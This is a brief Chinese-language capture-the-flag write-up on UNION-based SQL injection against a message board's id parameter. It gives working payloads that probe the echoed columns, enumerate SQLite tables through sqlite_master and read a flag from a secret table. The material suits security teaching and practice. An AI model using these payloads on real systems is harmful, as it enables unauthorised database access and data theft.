# 01 - UNION 回显型 SQL 注入

## 漏洞点

留言板 `?id=` 参数直接拼进 SQL，页面底部还开了调试模式暴露原查询：

```sql
SELECT id, author, title, content FROM messages WHERE id=1
```

4 列，其中 `author / title / content` 三列会回显到页面。

## 利用思路

用 `id=-1` 让原查询无结果，再 `UNION SELECT` 把想要的数据塞进回显列。

1. 探列 + 定位回显位：

```
?id=-1 UNION SELECT 1,2,3,4
```

页面 `<h3>` 显示 3（title=第3列），`content` 显示 4（content=第4列），`作者` 显示 2。

2. 枚举表名（SQLite）：

```
?id=-1 UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table'
```

得到 `messages,sqlite_sequence,secret`。

3. 读 secret 表里的 flag：

```
?id=-1 UNION SELECT 1,2,3,group_concat(flag) FROM secret
```

> 注意：URL 里空格要编码成 `%20`，浏览器地址栏一般会自动处理。
